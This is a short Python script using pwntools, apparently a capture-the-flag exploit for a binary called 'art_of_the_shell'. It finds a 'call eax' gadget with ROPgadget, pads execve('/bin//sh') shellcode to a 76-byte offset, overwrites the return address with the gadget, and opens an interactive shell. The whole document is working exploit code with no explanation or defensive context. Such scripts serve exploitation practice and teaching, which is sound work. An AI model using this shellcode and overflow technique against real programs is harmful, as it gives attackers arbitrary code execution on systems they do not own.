

import os
import subprocess
from pwn import *

def calleax(command):
	ans = os.popen(command).read()
	end = ans.find(" :")
	return ans[:end]


command = "ROPgadget --binary art_of_the_shell --only \"call|ret\" |grep eax"

shellcode = "\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"

junk = "A"*(76 - len(shellcode))

call_eax = int(calleax(command), 16)

payload = shellcode + junk + p32(call_eax)

p = process(['./art_of_the_shell', payload])
p.interactive()

